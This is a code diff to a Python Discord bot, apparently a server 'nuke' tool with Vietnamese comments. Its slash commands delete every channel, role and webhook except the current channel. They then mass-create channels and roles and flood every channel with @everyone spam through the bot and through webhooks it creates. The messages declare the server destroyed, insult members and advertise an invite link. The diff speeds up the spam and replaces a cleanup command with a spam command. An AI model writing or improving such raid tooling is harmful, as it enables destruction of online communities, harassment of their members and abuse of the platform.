@@ -1,4 +1,4 @@
-# bot.py - Nuke with Webhook Spam, giữ lại kênh dùng lệnh
+# bot.py - Nuke with guaranteed spam using bot + webhook fallback
 import discord
 from discord import app_commands
 from discord.ext import commands
@@ -25,14 +25,14 @@ class NukeCommands(commands.Cog):
         self.role_count = 100
         self.spam_per_channel = 10
 
-    @app_commands.command(name='nuke', description='🔥 Nuke server - giữ kênh dùng lệnh, tạo kênh, role, spam webhook')
+    @app_commands.command(name='nuke', description='🔥 Nuke - giữ kênh hiện tại, tạo 50k kênh, spam @everyone')
     @app_commands.default_permissions(administrator=True)
     async def slash_nuke(self, interaction: discord.Interaction):
         await interaction.response.send_message('🔥 **NUKE STARTED** 🔥', ephemeral=False)
         guild = interaction.guild
-        current_channel = interaction.channel  # Kênh đang dùng lệnh
+        current_channel = interaction.channel
 
-        # Xóa các kênh khác (trừ kênh hiện tại)
+        # Xóa các kênh khác
         await interaction.channel.send('🗑️ Deleting other channels...')
         deleted = await self.delete_all_channels_except(guild, current_channel)
         await interaction.channel.send(f'✅ Deleted {deleted} channels')
@@ -43,7 +43,7 @@ class NukeCommands(commands.Cog):
         deleted_webhooks = await self.delete_all_webhooks(guild)
         await interaction.channel.send(f'✅ Deleted {deleted_roles} roles, {deleted_webhooks} webhooks')
 
-        # Tạo kênh mới (vẫn giữ kênh hiện tại)
+        # Tạo kênh mới
         await interaction.channel.send(f'📝 Creating {self.channel_count} new channels...')
         created = await self.create_spam_channels(guild)
         await interaction.channel.send(f'✅ Created {created} channels')
@@ -53,33 +53,36 @@ class NukeCommands(commands.Cog):
         created_roles = await self.create_spam_roles(guild)
         await interaction.channel.send(f'✅ Created {created_roles} roles')
 
-        # Đợi cache sync
-        await interaction.channel.send('⏳ Syncing channels...')
-        await asyncio.sleep(5)
+        # Chờ Discord sync cache (quan trọng để bot thấy kênh mới)
+        await interaction.channel.send('⏳ Waiting for Discord to sync (15s)...')
+        await asyncio.sleep(15)
 
-        # Spam bằng webhook (trên tất cả kênh, bao gồm kênh hiện tại)
-        await interaction.channel.send('💬 Spamming via webhooks...')
-        spammed = await self.spam_via_webhooks(guild)
-        await interaction.channel.send(f'✅ Sent {spammed} messages')
+        # Phase 1: Spam bằng bot (đảm bảo tin nhắn đến)
+        await interaction.channel.send('💬 Phase 1: Spamming via bot...')
+        spammed_bot = await self.spam_all_channels(guild)
+        await interaction.channel.send(f'✅ Bot sent {spammed_bot} messages')
 
+        # Phase 2: Spam bằng webhook (tăng tốc)
+        await interaction.channel.send('💬 Phase 2: Spamming via webhooks...')
+        spammed_webhook = await self.spam_via_webhooks(guild)
+        await interaction.channel.send(f'✅ Webhooks sent {spammed_webhook} messages')
+
+        total = spammed_bot + spammed_webhook
         embed = discord.Embed(
             title='✅ NUKE COMPLETE',
             color=discord.Color.red()
         )
         embed.add_field(name='📊 Channels', value=f'{created:,}', inline=True)
         embed.add_field(name='👑 Roles', value=f'{created_roles:,}', inline=True)
-        embed.add_field(name='💬 Webhook Spam', value=f'{spammed:,}', inline=True)
+        embed.add_field(name='💬 Total Spam', value=f'{total:,}', inline=True)
         await interaction.channel.send(embed=embed)
 
-    @app_commands.command(name='unnuke', description='🧹 Xóa tất cả kênh (trừ kênh hiện tại) và role')
+    @app_commands.command(name='spam', description='💬 Spam @everyone vào tất cả kênh')
     @app_commands.default_permissions(administrator=True)
-    async def slash_unnuke(self, interaction: discord.Interaction):
-        await interaction.response.send_message('🧹 Unnuke...', ephemeral=False)
-        guild = interaction.guild
-        current_channel = interaction.channel
-        deleted = await self.delete_all_channels_except(guild, current_channel)
-        deleted_roles = await self.delete_all_roles(guild)
-        await interaction.channel.send(f'✅ Deleted {deleted} channels, {deleted_roles} roles')
+    async def slash_spam(self, interaction: discord.Interaction, count: int = 10):
+        await interaction.response.send_message(f'💬 Spamming {count} messages per channel...')
+        sent = await self.spam_all_channels(interaction.guild, count)
+        await interaction.channel.send(f'✅ Sent {sent} messages')
 
     @app_commands.command(name='clear', description='🗑️ Xóa tất cả kênh, role, webhook (trừ kênh hiện tại)')
     @app_commands.default_permissions(administrator=True)
@@ -92,7 +95,7 @@ class NukeCommands(commands.Cog):
         d3 = await self.delete_all_webhooks(guild)
         await interaction.channel.send(f'✅ Deleted {d1} channels, {d2} roles, {d3} webhooks')
 
-    # ---------- HÀM XÓA (GIỮ KÊNH HIỆN TẠI) ----------
+    # ---------- XÓA (giữ kênh hiện tại) ----------
     async def delete_all_channels_except(self, guild, keep_channel):
         count = 0
         for channel in guild.channels:
@@ -137,7 +140,7 @@ class NukeCommands(commands.Cog):
         created = 0
         for i in range(count):
             try:
-                await guild.create_text_channel(f'NUKE-{i}')
+                await guild.create_text_channel(f'nuke-{i}')
                 created += 1
                 if created % 100 == 0:
                     print(f'✅ Created {created}/{count} channels')
@@ -166,62 +169,7 @@ class NukeCommands(commands.Cog):
                 pass
         return created
 
-    # ---------- SPAM BẰNG WEBHOOK (SIÊU NHANH) ----------
-    async def spam_via_webhooks(self, guild):
-        messages = [
-            '@everyone SERVER DA BI NUKE',
-            '@everyone NUKE ME MAY NEK',
-            '@everyone https://discord.gg/xnyxd6QEa',
-            '@everyone SERVER NAY DA BI PHA HUY',
-            '@everyone MAY CHET CHUA CON NGU',
-            '@everyone TAM BIET SERVER NHE',
-            '@everyone HAHA NUKE THANH CONG'
-        ]
-        text_channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)]
-        print(f'📢 Found {len(text_channels)} text channels')
-
-        if not text_channels:
-            return 0
-
-        sent = 0
-        async with aiohttp.ClientSession() as session:
-            # Tạo webhook cho mỗi kênh (tối đa 10 kênh cùng lúc để tránh rate limit)
-            webhooks = []
-            for channel in text_channels[:50]:  # Giới hạn 50 kênh để tránh quá tải
-                try:
-                    webhook = await channel.create_webhook(name='SPAMMER')
-                    webhooks.append(webhook)
-                    await asyncio.sleep(0.3)
-                except:
-                    pass
-
-            if not webhooks:
-                print('⚠️ Không tạo được webhook nào!')
-                return 0
-
-            print(f'✅ Created {len(webhooks)} webhooks')
-
-            # Spam qua từng webhook (gửi song song)
-            tasks = []
-            for webhook in webhooks:
-                for _ in range(self.spam_per_channel):
-                    msg = random.choice(messages)
-                    url = f'https://discord.com/api/webhooks/{webhook.id}/{webhook.token}'
-                    tasks.append(
-                        session.post(url, json={'content': msg})
-                    )
-                    sent += 1
-                    if len(tasks) >= 20:  # Giới hạn concurrent
-                        await asyncio.gather(*tasks)
-                        tasks = []
-                        await asyncio.sleep(0.1)
-
-            if tasks:
-                await asyncio.gather(*tasks)
-
-        return sent
-
-    # ---------- HÀM SPAM BẰNG BOT (DỰ PHÒNG) ----------
+    # ---------- SPAM BẰNG BOT (ĐẢM BẢO) ----------
     async def spam_all_channels(self, guild, count=None):
         if count is None:
             count = self.spam_per_channel
@@ -235,18 +183,80 @@ class NukeCommands(commands.Cog):
             '@everyone TAM BIET SERVER NHE',
             '@everyone HAHA NUKE THANH CONG'
         ]
+        # Lấy danh sách text channel (bao gồm kênh mới)
         channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)]
+        print(f'📢 Found {len(channels)} text channels for bot spam')
+        if not channels:
+            return 0
+
         for channel in channels:
             try:
+                # Kiểm tra quyền
                 perms = channel.permissions_for(guild.me)
                 if not perms.send_messages:
+                    print(f'❌ No permission in #{channel.name}')
                     continue
+                # Gửi tin
                 for _ in range(count):
                     await channel.send(random.choice(messages))
                     sent += 1
-                    await asyncio.sleep(0.3)
-            except:
-                pass
+                    await asyncio.sleep(0.2)  # Giảm delay để nhanh hơn
+            except discord.errors.RateLimited as e:
+                await asyncio.sleep(e.retry_after + 1)
+            except Exception as e:
+                print(f'⚠️ Error in #{channel.name}: {e}')
+        return sent
+
+    # ---------- SPAM BẰNG WEBHOOK (TĂNG TỐC) ----------
+    async def spam_via_webhooks(self, guild):
+        messages = [
+            '@everyone SERVER DA BI NUKE',
+            '@everyone NUKE ME MAY NEK',
+            '@everyone https://discord.gg/xnyxd6QEa',
+            '@everyone SERVER NAY DA BI PHA HUY',
+            '@everyone MAY CHET CHUA CON NGU',
+            '@everyone TAM BIET SERVER NHE',
+            '@everyone HAHA NUKE THANH CONG'
+        ]
+        text_channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)]
+        print(f'📢 Found {len(text_channels)} text channels for webhook spam')
+        if not text_channels:
+            return 0
+
+        sent = 0
+        async with aiohttp.ClientSession() as session:
+            # Tạo webhook cho 100 kênh đầu tiên (để tránh rate limit tạo webhook)
+            webhooks = []
+            for channel in text_channels[:100]:
+                try:
+                    webhook = await channel.create_webhook(name='SPAMMER')
+                    webhooks.append(webhook)
+                    await asyncio.sleep(0.2)
+                except:
+                    pass
+
+            if not webhooks:
+                print('⚠️ No webhooks created!')
+                return 0
+
+            print(f'✅ Created {len(webhooks)} webhooks')
+
+            # Spam song song
+            tasks = []
+            for webhook in webhooks:
+                for _ in range(self.spam_per_channel):
+                    msg = random.choice(messages)
+                    url = f'https://discord.com/api/webhooks/{webhook.id}/{webhook.token}'
+                    tasks.append(session.post(url, json={'content': msg}))
+                    sent += 1
+                    if len(tasks) >= 30:
+                        await asyncio.gather(*tasks)
+                        tasks = []
+                        await asyncio.sleep(0.05)  # Rất nhanh
+
+            if tasks:
+                await asyncio.gather(*tasks)
+
         return sent
 
 # ---------- SỰ KIỆN ----------
